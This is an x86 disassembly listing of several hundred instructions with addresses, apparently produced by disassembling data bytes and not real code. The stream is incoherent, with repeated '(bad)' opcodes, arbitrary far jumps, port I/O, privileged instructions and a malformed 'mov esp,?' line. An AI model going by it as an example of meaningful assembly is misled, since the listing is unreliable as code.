  406d69:	jecxz  0x406d5f
  406d6b:	cmc    
  406d6c:	jmp    0xbdc7:0x85092137
  406d73:	inc    eax
  406d74:	mov    BYTE PTR ds:0x5a1b65b3,cl
  406d7a:	jmp    0x406db9
  406d7c:	inc    esp
  406d7d:	repnz outs dx,BYTE PTR ds:[esi]
  406d7f:	dec    ebx
  406d80:	mov    ebp,0x42bdc203
  406d85:	dec    ecx
  406d86:	xchg   edi,eax
  406d87:	and    bh,BYTE PTR [esi]
  406d89:	popa   
  406d8a:	adc    DWORD PTR ds:0xd9c444bf,ebp
  406d90:	popf   
  406d91:	fnstenv [edx+0x78680ed1]
  406d97:	rol    BYTE PTR [edx],1
  406d99:	or     DWORD PTR [edi+0x635ec8cd],ecx
  406d9f:	jno    0x406d9b
  406da1:	lods   al,BYTE PTR ds:[esi]
  406da2:	and    al,0xdd
  406da4:	sbb    cl,BYTE PTR [bp+si]
  406da7:	push   edx
  406da8:	jo     0x406dde
  406daa:	fsubr  DWORD PTR [edi+0x5fd55c2a]
  406db0:	faddp  st(3),st
  406db2:	jbe    0x406db2
  406db4:	xchg   DWORD PTR ds:0x7054d98b,ebx
  406dba:	imul   DWORD PTR [ebp-0xbecdea]
  406dc0:	stos   DWORD PTR es:[edi],eax
  406dc1:	xor    al,0xa7
  406dc3:	fdiv   st,st(7)
  406dc5:	les    ecx,FWORD PTR [ebp+ebx*2-0xd]
  406dc9:	out    0xb6,eax
  406dcb:	pop    edi
  406dcc:	ss cmp edx,ebp
  406dcf:	popf   
  406dd0:	repnz mov al,ds:0xc32bf136
  406dd6:	mov    ebp,0xc8d7b441
  406ddb:	sahf   
  406ddc:	dec    esp
  406ddd:	cmp    al,BYTE PTR [eax]
  406ddf:	or     BYTE PTR ds:0x5571f229,ah
  406de5:	inc    edx
  406de6:	rcr    ch,1
  406de8:	xchg   ebp,eax
  406de9:	(bad)  [eax]
  406deb:	rcl    BYTE PTR [ecx],cl
  406ded:	xchg   DWORD PTR [eax+edi*8-0x1924c231],edx
  406df4:	dec    ebx
  406df5:	test   BYTE PTR [ebp-0x37],dh
  406df8:	sbb    BYTE PTR [eax-0x1a],dl
  406dfb:	ds cmp eax,0x134c4610
  406e01:	push   edi
  406e02:	pop    ss
  406e03:	add    eax,0xf1c19688
  406e08:	fs push esp
  406e0a:	fstp   DWORD PTR [ebp-0x54]
  406e0d:	mov    ebp,0xe312e32f
  406e12:	xchg   edx,eax
  406e13:	mov    ch,0x8a
  406e15:	pavgb  mm4,mm6
  406e18:	test   al,0x23
  406e1a:	dec    esp
  406e1b:	leave  
  406e1c:	popa   
  406e1d:	outs   dx,DWORD PTR ds:[esi]
  406e1e:	adc    cl,BYTE PTR [ebp+0x52a087de]
  406e24:	in     eax,0xfe
  406e26:	and    ebp,ebp
  406e28:	popa   
  406e29:	sbb    eax,0xb379b47c
  406e2e:	sbb    eax,0x992dcba1
  406e33:	data16 jg 0x406e05
  406e36:	stos   DWORD PTR es:[edi],eax
  406e37:	sahf   
  406e38:	aad    0x28
  406e3a:	mov    ch,0xc2
  406e3c:	xor    al,0x5
  406e3e:	mov    eax,ds:0xf6c7b263
  406e43:	mov    edi,0x20f6e9f2
  406e48:	loopne 0x406ec0
  406e4a:	ret    0xd40b
  406e4d:	add    eax,0xd86d83f0
  406e52:	popa   
  406e53:	sub    al,0x98
  406e55:	mov    bl,0x63
  406e57:	dec    DWORD PTR [eax+0x119a5774]
  406e5d:	clc    
  406e5e:	jl     0x406eca
  406e60:	das    
  406e61:	fucom  st(7)
  406e63:	pop    edi
  406e64:	dec    ecx
  406e65:	mov    esp,0x40b6d67e
  406e6a:	out    dx,al
  406e6b:	loope  0x406ec8
  406e6d:	outs   dx,DWORD PTR ds:[esi]
  406e6e:	sbb    BYTE PTR [ebx],al
  406e70:	in     eax,0xe4
  406e72:	ficomp WORD PTR [ebx+ebp*1]
  406e75:	mov    ds:0x8d12ccc7,eax
  406e7a:	fwait
  406e7b:	test   DWORD PTR [edi],edx
  406e7d:	sbb    eax,0xfd2143dc
  406e82:	adc    DWORD PTR [edx+0x69],ebp
  406e85:	or     al,0xfb
  406e87:	aaa    
  406e88:	je     0x406e60
  406e8a:	xchg   BYTE PTR [eax],cl
  406e8c:	div    bh
  406e8e:	cwde   
  406e8f:	jb     0x406ecf
  406e91:	cli    
  406e92:	adc    bl,dl
  406e94:	in     al,0xab
  406e96:	inc    ebx
  406e97:	test   eax,0x5fbbcf41
  406e9c:	stos   BYTE PTR es:[edi],al
  406e9d:	dec    esi
  406e9e:	cmp    BYTE PTR [ecx*8-0x4d0c17e],al
  406ea5:	rol    DWORD PTR [edx+edi*2-0x32a36bc7],1
  406eac:	add    bl,dh
  406eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eaf:	jns    0x406ea6
  406eb1:	pop    esi
  406eb2:	xor    esi,DWORD PTR [eax+0x6c421039]
  406eb8:	sbb    edi,DWORD PTR [esi]
  406eba:	ror    BYTE PTR [ebp+0x77],0x3a
  406ebe:	push   0xffffff90
  406ec0:	mov    al,ds:0x80f99c6a
  406ec5:	xchg   ebp,eax
  406ec6:	les    ecx,FWORD PTR [edi-0x76ed8c77]
  406ecc:	pushf  
  406ecd:	out    0x7a,eax
  406ecf:	pop    esp
  406ed0:	xor    al,BYTE PTR [ebx-0x6f]
  406ed3:	push   ebp
  406ed4:	mov    al,0x54
  406ed6:	adc    ebp,DWORD PTR [ecx-0x3c]
  406ed9:	mov    ebp,0x74c18da6
  406ede:	sub    edx,DWORD PTR [esi]
  406ee0:	call   0xabad:0xbb868ae1
  406ee7:	shl    BYTE PTR [edi-0x1],cl
  406eea:	pop    edx
  406eeb:	hlt    
  406eec:	lods   al,BYTE PTR ds:[esi]
  406eed:	sbb    al,0x56
  406eef:	xor    al,0x43
  406ef1:	fcomp  st(5)
  406ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ef4:	aas    
  406ef5:	xor    edx,edx
  406ef7:	mov    bh,0xc3
  406ef9:	mov    al,0x94
  406efb:	jns    0x406eea
  406efd:	popa   
  406efe:	stc    
  406eff:	ss leave 
  406f01:	(bad)  
  406f02:	and    esi,esi
  406f04:	fwait
  406f05:	inc    esp
  406f06:	push   0x9ed9a529
  406f0b:	pusha  
  406f0c:	sbb    edx,ebp
  406f0e:	retf   
  406f0f:	js     0x406f20
  406f11:	cli    
  406f12:	(bad)  
  406f13:	push   ss
  406f14:	adc    BYTE PTR [esi-0x129ade72],ah
  406f1a:	mov    ecx,0xf242a02b
  406f1f:	and    al,0x88
  406f21:	(bad)  
  406f22:	pop    ss
  406f23:	cmp    DWORD PTR [edx-0x266ab845],esi
  406f29:	int3   
  406f2a:	addr16 sbb ecx,ecx
  406f2d:	mov    al,0xde
  406f2f:	dec    edx
  406f30:	test   al,0x37
  406f32:	mov    ch,0xef
  406f34:	adc    DWORD PTR [edx-0x7e99d4fa],eax
  406f3a:	push   ds
  406f3b:	test   al,0x59
  406f3d:	shr    BYTE PTR [edi-0x57],cl
  406f40:	add    ah,BYTE PTR [ecx]
  406f42:	in     al,dx
  406f43:	push   esp
  406f44:	pop    ss
  406f45:	(bad)  
  406f46:	mov    bh,0x62
  406f48:	jge    0x406f80
  406f4a:	stc    
  406f4b:	cdq    
  406f4c:	mov    ss,WORD PTR ds:0x1a52c437
  406f52:	sti    
  406f53:	push   ecx
  406f54:	leave  
  406f55:	ins    BYTE PTR es:[edi],dx
  406f56:	jmp    0x594b154f
  406f5b:	dec    edx
  406f5c:	not    BYTE PTR [esi+0x4560f025]
  406f62:	shl    esi,1
  406f64:	pop    esi
  406f65:	(bad)  
  406f66:	and    dl,BYTE PTR [ecx]
  406f68:	xchg   ecx,eax
  406f69:	or     eax,0x7b4d965
  406f6e:	(bad)  
  406f6f:	pop    ds
  406f70:	sbb    DWORD PTR [edi],eax
  406f72:	retf   
  406f73:	(bad)  
  406f74:	aam    0x85
  406f76:	add    al,0xa2
  406f78:	shr    BYTE PTR [edi+0x1d],cl
  406f7b:	js     0x406f25
  406f7d:	gs out dx,al
  406f7f:	(bad)  [edi+eax*8-0x6af95439]
  406f86:	mov    ecx,DWORD PTR [edi]
  406f88:	add    bl,BYTE PTR [ebp-0x59ec4219]
  406f8e:	sbb    ebx,DWORD PTR [eax+0x17]
  406f91:	ins    BYTE PTR es:[edi],dx
  406f92:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  406f94:	inc    ebx
  406f95:	mov    ch,0x8b
  406f97:	loop   0x406f43
  406f99:	inc    edi
  406f9a:	mov    edx,0x9ac9eb0d
  406f9f:	mov    WORD PTR [ecx],ds
  406fa1:	inc    esi
  406fa2:	mov    ebp,0xaaabd7b5
  406fa7:	in     al,dx
  406fa8:	sbb    eax,0xa7cf016b
  406fad:	pop    edi
  406fae:	mov    dh,0xe8
  406fb0:	sbb    BYTE PTR [eax-0x43b2635d],ah
  406fb6:	std    
  406fb7:	(bad)  [eax+0x3f74a08c]
  406fbd:	mov    esi,0x9ea2a2c9
  406fc2:	add    ecx,DWORD PTR [ecx-0xd]
  406fc5:	es xor al,0xa3
  406fc8:	hlt    
  406fc9:	mov    dl,BYTE PTR [edi]
  406fcb:	pushf  
  406fcc:	ins    BYTE PTR es:[edi],dx
  406fcd:	js     0x407034
  406fcf:	push   esp
  406fd0:	mov    cl,bl
  406fd2:	enter  0xa006,0x84
  406fd6:	aam    0x8f
  406fd8:	xchg   edi,eax
  406fd9:	inc    ebp
  406fda:	add    ah,BYTE PTR [edi+0x35cc7fc0]
  406fe0:	mov    ecx,0xaee700a6
  406fe5:	sub    al,BYTE PTR [edx-0x67]
  406fe8:	or     eax,0xb3093578
  406fed:	fbld   TBYTE PTR [ebx]
  406fef:	pop    ebp
  406ff0:	or     ah,BYTE PTR [ebp+0x5b]
  406ff3:	ss std 
  406ff5:	push   es
  406ff6:	cmp    DWORD PTR [ecx],0xffffffb9
  406ff9:	dec    esp
  406ffa:	ffreep st(6)
  406ffc:	fistp  QWORD PTR [ecx]
  406ffe:	cli    
  406fff:	adc    eax,0x9db4d723
  407004:	sbb    esp,DWORD PTR ds:0x6fd11496
  40700a:	aad    0xcd
  40700c:	xchg   esp,eax
  40700d:	in     al,dx
  40700e:	xchg   bh,al
  407010:	pop    ebx
  407011:	neg    ecx
  407013:	in     al,dx
  407014:	dec    ecx
  407015:	into   
  407016:	hlt    
  407017:	test   eax,0xe86c10eb
  40701c:	bound  edx,QWORD PTR [esi]
  40701e:	repnz pop edi
  407020:	pop    ecx
  407021:	shr    edi,0x4e
  407024:	aam    0xa0
  407026:	push   esp
  407027:	cli    
  407028:	(bad)  
  407029:	or     eax,0xeb2f652
  40702e:	idiv   ah
  407030:	inc    edi
  407031:	test   BYTE PTR [esi-0x6b28375],0x92
  407038:	icebp  
  407039:	jb     0x407088
  40703b:	hlt    
  40703c:	sbb    eax,0xfc1a7c5c
  407041:	mov    bh,0x45
  407043:	sub    eax,DWORD PTR [ecx+0x73f2f21b]
  407049:	test   eax,0x9a026d74
  40704e:	xchg   edi,eax
  40704f:	push   edx
  407050:	bound  ecx,QWORD PTR [ebx]
  407052:	and    eax,0xfb30583b
  407057:	jl     0x4070d2
  407059:	aaa    
  40705a:	push   0x7327b429
  40705f:	test   BYTE PTR [ebx+0x3d8c184d],ah
  407065:	sbb    DWORD PTR [edx],ebx
  407067:	jmp    0x4070e2
  407069:	dec    edi
  40706a:	mov    ebx,0x6f8c15d8
  40706f:	or     ebx,DWORD PTR [edi]
  407071:	sub    eax,0x25417c3e
  407076:	push   es
  407077:	out    0xa0,eax
  407079:	jb     0x4070e7
  40707b:	test   DWORD PTR [esi-0x19],edx
  40707e:	inc    ebp
  40707f:	xor    al,0xcf
  407081:	sbb    bl,BYTE PTR [ebp+0x1e659c71]
  407087:	fistp  DWORD PTR [ebp-0x1a794781]
  40708d:	sbb    DWORD PTR [eax+0x29],esp
  407090:	(bad)  
  407091:	mov    ebx,0x2892e2ff
  407096:	leave  
  407097:	or     DWORD PTR [edi-0x6ea2a2f7],edi
  40709d:	xchg   esp,eax
  40709e:	int3   
  40709f:	push   ecx
  4070a0:	add    al,0x73
  4070a3:	pop    esp
  4070a4:	mov    esp,?
  4070a6:	cwde   
  4070a7:	scas   eax,DWORD PTR es:[edi]
  4070a8:	or     ch,BYTE PTR [ecx]
  4070aa:	or     ch,BYTE PTR [edi]
  4070ac:	jg     0x4070fe
  4070ae:	mov    dh,0x90
  4070b0:	mov    eax,0xbc353d23
  4070b5:	sbb    al,BYTE PTR [eax+0x30ebda8]
  4070bb:	ss aas 
  4070bd:	pop    ss
  4070be:	rcr    DWORD PTR gs:0x749e8d32,0x22
  4070c6:	jmp    0xb4c1:0xea727d15
  4070cd:	adc    ebp,ecx
  4070cf:	xor    ecx,ebp
  4070d1:	add    edi,DWORD PTR [esi]
  4070d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070d4:	or     eax,0x84a10813
  4070d9:	push   ecx
  4070da:	and    cl,BYTE PTR [edx-0x1d2e9a76]
  4070e0:	jbe    0x407082
  4070e2:	fcmovnu st,st(0)
  4070e4:	fcmovbe st,st(6)
  4070e6:	sub    cl,BYTE PTR [esi]
  4070e8:	in     al,dx
  4070e9:	or     DWORD PTR [ecx-0x605b8c9c],ebx
  4070ef:	adc    esp,ebx
  4070f1:	or     al,0x5e
  4070f3:	jmp    0x3d8f8cb5
  4070f8:	je     0x407168
  4070fa:	cmp    eax,0x4927a371
  4070ff:	scas   eax,DWORD PTR es:[edi]
  407100:	mov    ch,bl
  407102:	call   0x57ad:0x4ecc92af
  407109:	ins    DWORD PTR es:[edi],dx
  40710a:	pushf  
  40710b:	pop    edi
  40710c:	mov    edx,0x7c7b695a
  407111:	or     al,0xb7
  407113:	and    dl,BYTE PTR [edx-0x60]
  407116:	push   eax
  407117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407118:	or     DWORD PTR [ebx+0xa2246a3],ebx
  40711e:	mov    ds,WORD PTR [ecx]
  407120:	test   dl,dh
  407122:	loopne 0x4070d9
  407124:	aam    0x4c
  407126:	loop   0x407134
  407128:	aad    0x95
  40712a:	mov    dl,0x4b
  40712c:	mov    dh,0x84
  40712e:	pop    edx
  40712f:	and    ecx,ebx
  407131:	imul   ebx,DWORD PTR [edi-0x83c33e3],0xefc73657
  40713b:	cmp    DWORD PTR [edx-0x487c72],ecx
  407141:	repnz xchg esp,eax
  407143:	(bad)  
  407144:	pop    edi
  407145:	cli    
  407146:	test   BYTE PTR [esi+0x33d61cf5],0x11
  40714d:	aam    0x43
  40714f:	pushf  
  407150:	ss (bad) 
  407152:	dec    ebx
  407153:	aam    0xb6
  407155:	stos   BYTE PTR es:[edi],al
  407156:	test   eax,0x599ce973
  40715b:	jl     0x407100
  40715d:	pop    esi
  40715e:	into   
  40715f:	data16 or bh,cl
  407162:	fimul  WORD PTR [eax+ecx*2-0x8]
  407166:	inc    eax
  407167:	cmp    edi,DWORD PTR [esi]
  407169:	or     DWORD PTR [eax+0x53],edi
  40716c:	or     al,0x89
  40716e:	ja     0x4071c7
  407170:	lods   al,BYTE PTR ds:[esi]
  407171:	je     0x407114
  407173:	xchg   DWORD PTR [edi],ebx
  407175:	sbb    dh,ch
  407177:	add    BYTE PTR [ebx-0x60980fdc],ch
  40717d:	scas   al,BYTE PTR es:[edi]
  40717e:	mov    esp,0xab794fa1
  407183:	mov    edx,0x6cb85483
  407188:	jno    0x40710d
  40718a:	jb     0x407114
  40718c:	rcl    esp,1
  40718e:	pop    esp
  40718f:	mov    bl,0xb
  407191:	rcl    DWORD PTR [esi-0x52bb7da1],0xe8
  407198:	mov    eax,ds:0x644b6dd
  40719d:	clc    
  40719e:	cmp    eax,0x91c07ebf
  4071a3:	in     al,dx
  4071a4:	jge    0x407150
  4071a6:	(bad)  
  4071a7:	sub    al,0x38
  4071a9:	retf   0x38a9
  4071ac:	clc    
  4071ad:	inc    ecx
  4071ae:	ja     0x407190
  4071b0:	push   ss
  4071b1:	loopne 0x4071bf
  4071b3:	dec    edi
  4071b4:	or     bh,dl
  4071b6:	xor    eax,0xe2154852
  4071bb:	iret   
  4071bc:	dec    edx
  4071bd:	adc    eax,0x80d71c8f
  4071c2:	xchg   BYTE PTR [ecx],bh
  4071c4:	sbb    eax,0x11e41006
  4071c9:	sbb    edx,DWORD PTR [ebx-0x3cb3574b]
  4071cf:	add    ebp,ebx
  4071d1:	cmp    BYTE PTR gs:[ecx+edi*2+0x33],cl
  4071d6:	lods   eax,DWORD PTR ds:[esi]
  4071d7:	stc    
  4071d8:	inc    edi
  4071d9:	int    0x83
  4071db:	mov    dh,BYTE PTR [ebp-0x2fd87908]
  4071e1:	dec    ebx
  4071e2:	scas   al,BYTE PTR es:[edi]
  4071e3:	(bad)  
  4071e5:	std    
  4071e6:	shl    DWORD PTR [edi],1
  4071e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071e9:	hlt    
  4071ea:	ins    BYTE PTR es:[edi],dx
  4071eb:	pop    es
  4071ec:	test   eax,0xbde112b9
  4071f1:	js     0x40726c
  4071f3:	out    dx,al
  4071f4:	cs push cs
  4071f6:	cwde   
  4071f7:	xor    al,BYTE PTR [edi]
  4071f9:	jge    0x4071f6
  4071fb:	add    ebp,ecx
  4071fd:	pop    ecx
  4071fe:	jno    0x407200
  407200:	hlt    
  407201:	xchg   ecx,eax
  407202:	mov    WORD PTR [edi],ss
  407204:	fmul   DWORD PTR [ecx]
  407206:	jecxz  0x4071fc
  407208:	test   BYTE PTR [edx],0xf8
  40720b:	adc    DWORD PTR [ebx+0x3d],0x9722b1f7
  407212:	and    ebx,DWORD PTR [edx]
  407214:	cmc    
  407215:	into   
  407216:	mov    bh,0xb0
  407218:	pop    es
  407219:	bound  ecx,QWORD PTR [esi+0x3a8c2055]
  40721f:	pop    ecx
  407220:	sbb    eax,0xba37c1e8
  407225:	imul   edx,ebp,0xb8a74542
  40722b:	inc    esi
  40722c:	ret    0x3c81
  40722f:	popa   
  407230:	push   ds
  407231:	ds mov dl,0x3
  407234:	cmp    eax,0x1b093c50
  407239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723a:	pop    ebp
  40723b:	xor    al,0x95
  40723d:	bound  ebx,QWORD PTR [ebp-0x4b]
  407240:	test   edx,ebp
  407242:	add    DWORD PTR [esi],eax
  407244:	xor    DWORD PTR [esi+eiz*1],ebp
  407247:	fcomp  QWORD PTR [esi+0x1d3b1e0f]
  40724d:	test   al,0x4a
  40724f:	push   ecx
  407250:	ins    DWORD PTR es:[edi],dx
  407251:	jnp    0x407260
  407253:	arpl   WORD PTR [ecx+0x66],dx
  407256:	es cdq 
  407258:	push   ss
  407259:	lahf   
  40725a:	sub    cl,BYTE PTR [ebx+eax*8+0x31cfdbdc]
  407261:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  407263:	push   ecx
  407264:	cmp    bh,BYTE PTR [edx]
  407266:	adc    DWORD PTR [edx-0x68e3ec46],esi
  40726c:	push   edi
  40726d:	pop    ds
  40726e:	cld    
  40726f:	retf   
  407270:	(bad)  
  407271:	repz test DWORD PTR [eax-0xc],eax
  407275:	push   ebp
  407276:	xor    ah,bh
  407278:	ret    0x3a0a
  40727b:	cdq    
  40727c:	arpl   WORD PTR ds:[ecx-0x62],dx
  407280:	(bad)  
  407283:	(bad)  
  407284:	jmp    0xf58f:0xb6a41d88
  40728b:	adc    ecx,esi
  40728d:	cwde   
  40728e:	jb     0x4072c6
  407290:	sar    BYTE PTR [edi],cl
  407292:	jbe    0x407278
  407294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407295:	inc    edx
  407296:	push   0xb414e64a
  40729b:	lods   eax,DWORD PTR ds:[si]
  40729d:	sub    DWORD PTR [edi+0x1d3c6327],0x66
  4072a4:	jae    0x40723d
  4072a6:	fcom   DWORD PTR [esp+esi*4+0x1a]
  4072aa:	out    0x40,eax
  4072ac:	nop
  4072ad:	repz clc 
  4072af:	jecxz  0x407239
  4072b1:	xchg   DWORD PTR [esi],edx
  4072b3:	mov    ds:0x11926d0,eax
  4072b8:	push   cs
  4072b9:	sbb    ch,BYTE PTR [ebx+eax*1+0x6b89fd42]
  4072c0:	cmp    esi,0x5fe5eb96
  4072c6:	push   ecx
  4072c7:	bound  esi,QWORD PTR [ebx]
  4072c9:	fild   QWORD PTR [eax]
  4072cb:	ins    DWORD PTR es:[edi],dx
  4072cc:	call   0x129b064a
  4072d1:	hlt    
  4072d2:	adc    al,0x43
  4072d4:	int3   
  4072d5:	sbb    BYTE PTR [edx+0x6f],0xae
  4072d9:	lods   al,BYTE PTR ds:[esi]
  4072da:	fistp  WORD PTR [eax+0x4]
  4072dd:	pop    edx
  4072de:	mov    esi,0xbde96535
  4072e3:	std    
  4072e4:	push   0x3f1169e4
  4072e9:	xchg   edx,eax
  4072ea:	shl    BYTE PTR [edi-0x5524daef],0xaa
  4072f1:	lds    edx,FWORD PTR [ecx]
  4072f3:	aas    
  4072f4:	addr16 test eax,0xc8d469b5
  4072fa:	ins    BYTE PTR es:[edi],dx
  4072fb:	push   eax
  4072fc:	ret    
  4072fd:	test   BYTE PTR [esi],ch
  4072ff:	push   es
  407300:	jge    0x4072cf
  407302:	into   
  407303:	and    eax,0xee588ffd
  407308:	pop    ecx
  407309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40730a:	retf   
  40730b:	mov    ebp,0xafe55a60
  407310:	pushf  
  407311:	outs   dx,DWORD PTR ds:[esi]
  407312:	fcmovnu st,st(6)
  407314:	dec    esi
  407315:	je     0x4072e3
  407317:	lock push ebx
  407319:	dec    BYTE PTR [eax-0x1]
  40731c:	jno    0x407305
  40731e:	dec    edi
  40731f:	jge    0x4072f4
  407321:	test   eax,0xee30be82
  407326:	add    BYTE PTR [eax],bh
  407328:	xchg   edx,eax
  407329:	ret    0x2d6a
  40732c:	mov    BYTE PTR [edx+0x7fc1ba6e],ah
  407332:	pop    esp
  407333:	mov    al,0xd0
  407335:	cld    
  407336:	cmp    ebx,esp
  407338:	shl    DWORD PTR [ebx-0x6e6c669d],cl
  40733e:	or     eax,0x66f509b5
  407343:	in     eax,dx
  407344:	shl    BYTE PTR ds:0x52abbbf9,0xf8
  40734b:	mov    ebx,0xbda3013a
  407350:	pop    DWORD PTR [edx*4+0x10d29e58]
  407357:	test   eax,0x63bf080a
  40735d:	rol    DWORD PTR [esi],cl
  40735f:	popf   
  407360:	call   0xf71e:0xcc0f6a02
  407367:	inc    esp
  407368:	cld    
  407369:	inc    edx
  40736a:	mov    dl,0x40
  40736c:	inc    ebp
  40736d:	adc    BYTE PTR [ecx+0x49564817],ah
  407373:	inc    edi
  407374:	xchg   edx,eax
  407375:	jb     0x407309
  407377:	fs xor al,0xb1
  40737a:	mov    esp,0x398b5884
  40737f:	ins    BYTE PTR es:[edi],dx
  407380:	test   DWORD PTR [ecx+0x77],edi
  407383:	popa   
  407384:	out    0x55,eax
  407386:	(bad)  
  407387:	adc    al,0x59
  407389:	jecxz  0x40736a
  40738b:	scas   al,BYTE PTR es:[edi]
  40738c:	sbb    eax,0x1cc095d0
  407391:	cld    
  407392:	cli    
  407393:	pop    edx
  407394:	adc    al,0x85
  407397:	ror    BYTE PTR [ebx-0x426fa1cf],cl
  40739d:	push   edx
  40739e:	nop
  40739f:	shl    DWORD PTR [edi+0x13],1
  4073a2:	inc    ecx
  4073a3:	mov    ecx,0x814869e3
  4073a8:	jno    0x407371
  4073aa:	dec    eax
  4073ab:	arpl   WORD PTR [ecx-0x5c5534ce],bx
  4073b1:	dec    ebp
  4073b2:	push   ebx
  4073b3:	call   0x7402355c
  4073b8:	fadd   QWORD PTR [eax+esi*1+0x3c5b34a1]
  4073bf:	(bad)  
  4073c0:	mov    ecx,0xdb196ff4
  4073c5:	jae    0x407403
  4073c7:	or     eax,0xcc01c727
  4073cc:	ss push eax
  4073ce:	clc    
  4073cf:	sti    
  4073d0:	out    0x1b,al
  4073d2:	int3   
  4073d3:	mov    dl,0x8c
  4073d5:	mov    eax,ds:0xed5a450e
  4073da:	xchg   DWORD PTR [edi+0x77eaa2e9],ebx
  4073e0:	inc    esi
  4073e1:	and    DWORD PTR [eax-0x2a],esi
  4073e4:	test   al,0xb7
  4073e6:	or     ah,bh
  4073e8:	or     ebp,DWORD PTR [esi]
  4073ea:	je     0x40741b
  4073ec:	xor    BYTE PTR [edx+0x43],al
  4073ef:	out    dx,al
  4073f0:	out    0x6b,al
  4073f2:	loope  0x40746f
  4073f4:	mov    dl,0x7b
  4073f6:	xor    eax,0xd06962a9
  4073fb:	pusha  
  4073fc:	test   DWORD PTR [ebx-0xd],edx
  4073ff:	(bad)  
  407400:	cmp    al,0x38
  407402:	sub    ch,0xe2
  407405:	fsin   
  407407:	jo     0x407427
  407409:	jg     0x407438
  40740b:	call   DWORD PTR [eax]
  40740d:	aas    
  40740e:	xor    al,0x87
  407410:	xor    al,0xf0
  407412:	lds    eax,FWORD PTR [edi-0x184fb2a1]
  407418:	retf   
  407419:	mov    edi,0xfd4e5715
  40741e:	xor    edi,DWORD PTR [edx-0x3478c1a4]
  407424:	or     eax,0xaea19939
  407429:	sub    eax,0xf14092c1
  40742e:	test   eax,0xd89ad030
  407433:	add    ebx,DWORD PTR cs:[edx+0x61]
  407437:	lock mov edi,0x2199108
  40743d:	outs   dx,DWORD PTR ds:[esi]
  40743e:	(bad)  
  40743f:	jne    0x40747a
  407441:	xchg   edi,eax
  407442:	int3   
  407443:	nop
  407444:	mov    BYTE PTR [ecx+edi*8],0x14
  407448:	jmp    FWORD PTR [ebp+edx*2+0x60]
  40744c:	retf   0x4a44
  40744f:	jmp    0x47e5:0x8d254c14
  407456:	sbb    bl,BYTE PTR [eax]
  407458:	pop    es
  407459:	fbld   TBYTE PTR [esi]
  40745b:	test   eax,0x226fc507
  407460:	xlat   BYTE PTR ds:[ebx]
  407461:	test   BYTE PTR [eax-0x7e],cl
  407464:	gs enter 0x864c,0x48
  407469:	add    BYTE PTR [ecx+0x57bbc730],ah
  40746f:	add    eax,0xe6b5e1f4
  407474:	aad    0x3f
  407476:	mov    bh,0x7a
  407478:	mov    dl,0xfb
  40747a:	mov    al,0x38
  40747c:	cmc    
  40747d:	out    dx,al
  40747e:	and    al,0x31
  407480:	fwait
  407481:	(bad)  
  407482:	cmp    al,cl
  407484:	int    0x71
  407486:	icebp  
  407487:	mov    bl,0x55
  407489:	sbb    bl,dl
  40748b:	mov    eax,0x942e8b28
  407490:	repnz popf 
  407492:	mov    DWORD PTR [edx+0x6b34d8fa],ebp
  407498:	push   edx
  407499:	mov    ecx,0x273846c2
  40749e:	jo     0x4074fb
  4074a0:	sbb    BYTE PTR [esi+0x604b61f9],dl
  4074a6:	sbb    al,0x7f
  4074a8:	inc    eax
  4074a9:	nop
  4074aa:	sbb    eax,0x971511fd
  4074af:	rcr    BYTE PTR [edi-0x27b327d2],1
  4074b5:	xor    edi,eax
  4074b7:	cs mov bh,0x8d
  4074ba:	cmp    al,0x2b
  4074bc:	mov    ecx,0xac5f7f3d
  4074c1:	mov    esp,0x6cfc3e07
  4074c6:	pop    DWORD PTR [edi+0x3]
  4074c9:	pop    ebx
  4074ca:	mov    fs,WORD PTR [ebx+0x4aa8f93c]
  4074d0:	enter  0x3889,0x1
  4074d4:	fiadd  WORD PTR [ebp*4-0x21fc0359]
  4074db:	imul   ebp,DWORD PTR ds:[eax-0x3b6f383a],0xe67d2200
  4074e6:	push   es
  4074e7:	adc    BYTE PTR [edi],dh
  4074e9:	or     al,0xd5
  4074eb:	test   eax,0x6d3b85bd
  4074f0:	fisub  DWORD PTR [ebp+ecx*2+0x7b]
  4074f4:	das    
  4074f5:	jo     0x4074ca
  4074f7:	xchg   ebx,eax
  4074f8:	and    esp,DWORD PTR [ebx]
  4074fa:	rcl    BYTE PTR [esi],1
  4074fc:	inc    ebp
  4074fd:	cli    
  4074fe:	jno    0x407482
  407500:	inc    esi
  407501:	aam    0x5d
  407503:	mov    edi,0x87ee8a1e
  407508:	outs   dx,DWORD PTR ds:[esi]
  407509:	fwait
  40750a:	hlt    
  40750b:	fisttp WORD PTR [eax-0xa]
  40750e:	mov    edi,0x4f82b64d
  407513:	rol    DWORD PTR [esi+edx*1+0x59],1
  407517:	out    dx,eax
  407518:	add    ecx,edi
  40751a:	jge    0x407587
  40751c:	add    dl,cl
  40751e:	out    dx,al
  40751f:	pusha  
  407520:	dec    edx
  407521:	pop    esi
  407522:	daa    
  407523:	and    al,BYTE PTR [ebp+0x51]
  407526:	dec    ecx
  407527:	jne    0x407526
  407529:	cs cld 
  40752b:	inc    ebx
  40752c:	mov    ds:0xdc6fc80f,al
  407531:	inc    ebx
  407532:	sbb    dh,ch
  407534:	pop    ecx
  407535:	(bad)  
  407536:	retf   0x9486
  407539:	jl     0x407583
  40753b:	out    0xed,eax
  40753d:	loope  0x4074dd
  40753f:	sahf   
  407540:	fnsave [eax]
  407542:	les    edi,FWORD PTR [ecx-0x50d656e8]
  407548:	stc    
  407549:	fsub   QWORD PTR [ebx+0x2478752d]
  40754f:	iret   
  407550:	rcl    BYTE PTR [ebp+0x30],cl
  407553:	mov    al,ds:0xcd3a452e
  407558:	aam    0xd8
  40755a:	and    DWORD PTR [ebx],edx
  40755c:	jnp    0x40753d
  40755e:	stos   DWORD PTR es:[edi],eax
  40755f:	inc    edi
  407560:	scas   eax,DWORD PTR es:[edi]
  407561:	arpl   WORD PTR [ebp+esi*8+0x75],dx
  407565:	repz daa 
  407567:	push   ecx
  407568:	gs xor al,0x2
  40756b:	sub    eax,0xefe9ee51
  407570:	jae    0x407556
  407572:	sbb    al,0xa4
